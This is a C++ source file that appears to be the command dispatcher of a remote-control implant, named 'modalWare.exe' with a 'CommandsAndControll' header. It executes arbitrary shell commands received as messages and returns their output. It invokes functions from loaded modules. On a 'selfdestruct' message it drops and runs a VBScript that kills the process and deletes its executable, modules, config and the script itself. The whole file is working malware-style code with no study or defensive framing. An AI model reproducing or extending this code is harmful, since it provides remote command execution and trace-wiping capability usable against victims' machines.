#include <iostream>
#include <cstdio>
#include <memory>
#include <array>
#include <string>
#include <fstream>
#include <sstream>
#include "Types.h"
#include "CommandsAndControll.h"
#include "Util.h"

#define SELFDESTRUCT_NAME "cleaner.vbs"

static ReturnData exec(const std::string& cmd);
static ReturnData callFunction(const std::unordered_map<std::string, ModuleStruct>& modules, const std::string& message);
static int selfDestruct();

ReturnData processMessage(const std::unordered_map<std::string, ModuleStruct> &modules, const std::string& message) {
    ReturnData result;
	if (message.length() > 2 && message.substr(0, 3) == "cmd") {
        result = exec(message.substr(4));
	}
    else if (message == "selfdestruct") {
        if (selfDestruct() == 1) {
            std::cout << "Self destruction failed" << std::endl;
            result = { StatusCode::FAILURE, "Self destruction failed" };
        };
    }
    else if (message.length() > 4 && message.substr(0, 3) == "lib") {
        result = callFunction(modules, message);
    }
    else {
        result = { StatusCode::FAILURE, "Commands doesnt fit pattern: " + message };
    }

    return result;
}
static ReturnData exec(const std::string& cmd) {
    std::array<char, 128> buffer;
    std::string result;

    FILE* pipe = _popen(cmd.c_str(), "r");
    if (!pipe) {
        char errorMsg[256];
        strerror_s(errorMsg, sizeof(errorMsg), errno);
        result = "Failed to run command: " + std::string(errorMsg);

        std::cout << "Failed to run command" << std::endl;
        return {StatusCode::FAILURE, result};
    }

    // Read the output line by line
    while (fgets(buffer.data(), static_cast<int>(buffer.size()), pipe) != nullptr) {
        result += buffer.data();
    }

    // Close the pipe
    _pclose(pipe);

    // Print the captured result
    std::cout << "Command Output:" << std::endl;
    std::cout << result << std::endl;

    return {StatusCode::SUCCESS, result};
}
int selfDestruct() {
    std::string vbScriptCode = R"(
    Dim fso, folder, moduleFolder
    Dim subFolder, file, currentDir, scriptFile, objShell

    Set fso = CreateObject("Scripting.FileSystemObject")

    currentDir = fso.GetParentFolderName(WScript.ScriptFullName)

    moduleFolder = currentDir & "\modules"

    If fso.FolderExists(moduleFolder) Then
        Set folder = fso.GetFolder(moduleFolder)
    
        For Each file In folder.Files
            file.Delete
        Next
    
        For Each subFolder In folder.Subfolders
            DeleteFolderRecursively subFolder
        Next

        folder.Delete
    End If

    Set objShell = CreateObject("WScript.Shell")

    objShell.Run "taskkill /F /IM modalWare.exe", 0, True

    exeFile = currentDir & "\modalWare.exe"
    If fso.FileExists(exeFile) Then
        fso.DeleteFile exeFile
    End If
    configFile = currentDir & "\config"
    If fso.FileExists(configFile) Then
        fso.DeleteFile configFile
    End If

    scriptFile = WScript.ScriptFullName
    fso.DeleteFile(scriptFile)


    Sub DeleteFolderRecursively(fldr)
        Dim subFile, subSubFolder

        For Each subFile In fldr.Files
            subFile.Delete
        Next
    
        For Each subSubFolder In fldr.Subfolders
            DeleteFolderRecursively subSubFolder
        Next
        
        fldr.Delete
    End Sub
    )";

    std::ofstream outFile(SELFDESTRUCT_NAME);

    if (outFile.is_open()) {
        outFile << vbScriptCode;

        outFile.close();

        std::cout << "VBScript file 'delete_script.vbs' has been created successfully." << std::endl;
    }
    else {
        std::cerr << "Error opening the file for writing!" << std::endl;
        return 1;
    }
    system(".\\" SELFDESTRUCT_NAME);

    return 1;
}
static ReturnData callFunction(const std::unordered_map<std::string, ModuleStruct> &modules, const std::string &message) {
    std::istringstream stream(message);
    std::string word;
    std::vector<std::string> words;

    while (stream >> word) {
        words.push_back(word);
    }

    ReturnData result;
    result.result = StatusCode::FAILURE;
    if (words.size() < 3) {
        result.value = "Minimum 3 arguments, Maximum 5 arguments";
        return result;
    }
    FindingResult findingResult = findFunction(modules, words[1], words[2]);
    switch (findingResult.result_id) {
    case FindingResultID::NO_MODULE:
        result.value = "No module with name " + words[1] + " has been found";
        [[fallthrough]];
    case FindingResultID::NO_FUNCTION:
        result.value = "No function with name " + words[2] + " has been found";
        return result;
    }
    if (words.size() - 3 != findingResult.fp.argCount) {
        result.value = "Not enough arguments";
        return result;
    }

    FunctionResult functionResult;
    ConvertionResult cResult1;
    ConvertionResult cResult2;
    switch (words.size()) {
    case 3:
        functionResult = findingResult.fp.autoCall();
        break;
    case 5:
        cResult2 = format::stringToAny(words[4], findingResult.fp.arg2_type);
        if (cResult2.status_code == StatusCode::FAILURE) {
            result.value = "Argument 2 has wrong type, expected: " + format::valueTypeToString(findingResult.fp.arg2_type);
        }
        [[fallthrough]];
    case 4:
        cResult1 = format::stringToAny(words[3], findingResult.fp.arg1_type);
        if (cResult1.status_code == StatusCode::FAILURE) {
            result.value = "Argument 1 has wrong type, expected: " + format::valueTypeToString(findingResult.fp.arg1_type);
        }
        break;
    }
    switch (words.size()) {
    case 3:
        functionResult = findingResult.fp.autoCall();
        break;
    case 4:
        functionResult = findingResult.fp.autoCall(cResult1.value);
        break;
    case 5:
        functionResult = findingResult.fp.autoCall(cResult1.value, cResult2.value);
        break;
    default:
        result.value = "Error happened";
        return result;
    }

    switch (functionResult.resultID) {
    case ValueType::DEFAULT_TYPE:
        result.value = "Error happened when calling function with name " + words[2];
        break;
    case ValueType::NONE_TYPE:
        result.value = "Function " + words[2] + " doesnt return any value";
        break;
    case ValueType::INT_TYPE:
        result.value = std::to_string(functionResult.value.int_result);
        break;
    case ValueType::FLOAT_TYPE:
        result.value = std::to_string(functionResult.value.float_result);
        break;
    case ValueType::CHAR_TYPE:
        result.value = std::string(functionResult.value.char_result);
        break;
    }
    return result;
}